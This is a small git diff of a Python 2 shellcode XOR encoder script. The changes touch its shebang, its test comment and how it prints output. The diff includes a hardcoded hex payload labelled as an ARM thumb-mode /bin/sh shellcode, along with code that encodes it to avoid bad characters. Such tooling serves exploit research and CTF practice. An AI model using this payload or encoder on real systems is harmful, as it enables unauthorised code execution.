@@ -1,4 +1,4 @@
-#!python
+#!/usr/bin/env python2
 import os
 import sys
 import tempfile
@@ -188,8 +188,10 @@ def checkBadChar(sc, bc=[0x00, 0x0a]):
     return bcs
 
 if __name__ == '__main__':
+    # for testing
     # /bin/sh in thumb mode
     SC = "02a000220b2705b4694601df2f62696e2f7368000000".decode('hex')
+    #SC = sys.stdin.read()
 
     prepareCompiler()
 
@@ -210,4 +212,4 @@ if __name__ == '__main__':
             os.unlink(RAW_SC)
         open(RAW_SC, 'wb').write(XORER + XORSC)
 
-    print XORSC.encode('hex')
+    print XORSC #.encode('hex')
